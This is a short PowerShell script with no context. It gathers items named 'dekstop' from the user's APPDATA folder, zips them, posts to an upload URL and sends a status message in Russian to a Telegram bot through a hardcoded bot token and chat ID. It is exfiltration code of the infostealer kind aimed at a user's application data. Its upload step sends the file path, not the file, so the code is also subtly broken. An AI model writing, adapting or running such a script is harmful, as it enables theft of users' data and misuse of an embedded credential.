$sourceDir = "$env:APPDATA"
$targetDir = "$env:TEMP"
$pattern = "dekstop"
$zipName = "dekstopArchive.zip"
$uploadUrl = "http://example.com/upload"
$telegramToken = "8189599213:AAHpwU1VxlgRdfcw0fbt9tosXsCyhkbR30M"
$telegramChatId = "7258123387"

Get-ChildItem -Path $sourceDir -Filter *$pattern* | ForEach-Object {
    $folderPath = $_.FullName
    $zipFilePath = Join-Path -Path $targetDir -ChildPath $zipName
    Compress-Archive -Path $folderPath -DestinationPath $zipFilePath -Force
    $uploadResponse = Invoke-RestMethod -Uri $uploadUrl -Method Post -Body $zipFilePath -ContentType "application/octet-stream"
    $telegramMessage = "Архив $zipName успешно загружен на хостинг. Ответ: $uploadResponse"
    $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$telegramChatId&text=$([uri]::EscapeDataString($telegramMessage))"
    Invoke-RestMethod -Uri $telegramUrl -Method Post
    Write-Host $telegramMessage
}

